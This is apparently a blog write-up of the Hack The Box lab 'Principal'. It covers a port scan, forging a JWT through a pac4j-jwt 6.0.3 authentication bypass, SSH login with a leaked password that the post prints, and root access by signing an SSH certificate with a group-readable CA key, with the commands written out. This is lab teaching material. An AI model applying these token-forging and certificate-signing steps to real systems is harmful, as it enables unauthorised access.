---
layout: post
title: "Principal - CTF Writeup"
date: 2026-05-31 15:00:00 +0200
description: "Writeup for Principal CTF."
categories: [hackthebox]
tags: [hackthebox]
---

# Principal - CTF Writeup

## Reconnaissance

The initial port scan showed only two exposed services: SSH and a Jetty-based web application on port `8080`.

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-28 09:52 -0400
Nmap scan report for 10.129.244.220
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
```

The HTTP service redirected to `/login` and exposed an interesting application header:

```http
HTTP/1.1 302 Found
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Location: /login
```

| Port | Service | Notes |
|------|---------|-------|
| `22/tcp` | SSH | OpenSSH 9.6p1 on Ubuntu |
| `8080/tcp` | HTTP / Jetty | Login page with `pac4j-jwt/6.0.3` header |

## Web Enumeration

After checking the visible application and finding no obvious path forward, the `X-Powered-By` header became the main lead:

```text
X-Powered-By: pac4j-jwt/6.0.3
```

Searching for this version led to a public writeup about a pac4j JWT authentication bypass:

```text
https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key
```

The application also exposed useful client-side logic in:

```text
/static/app.js
```

That JavaScript file contained the public key needed for token forging. At first, the forged token still did not grant access because I missed one important detail in the frontend auth flow: the token had to be placed in session storage as `auth_token`.

```javascript
sessionStorage.setItem("auth_token", token);
```

Once the forged JWT was stored in the expected place, the application accepted it.

## Initial Access

The application revealed an encryption key:

```text
D3pl0y_$$H_Now42!
```

Using that key, I was able to authenticate over SSH as `svc-deploy`.

```bash
ssh svc-deploy@10.129.244.220
```

## Privilege Escalation

After logging in, group enumeration showed that `svc-deploy` was a member of the `deployers` group:

```bash
groups
```

```text
deployers
```

Files owned by the `deployers` group revealed a custom SSH certificate setup:

```bash
find / -group deployers -ls 2>/dev/null
```

```text
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

The important finding was the SSH certificate authority key at:

```text
/opt/principal/ssh/ca
```

Because the current user could access the CA key, I could sign my own SSH key and create a certificate valid for the `root` principal.

```bash
cd /tmp
ssh-keygen -t ed25519 -f ./pwn -N "" -C pwn
ssh-keygen -s /opt/principal/ssh/ca -I pwn-root -n root -V +10m ./pwn.pub
ssh -i ./pwn -o CertificateFile=./pwn-cert.pub root@localhost
```

That certificate was accepted by SSH, giving a root shell.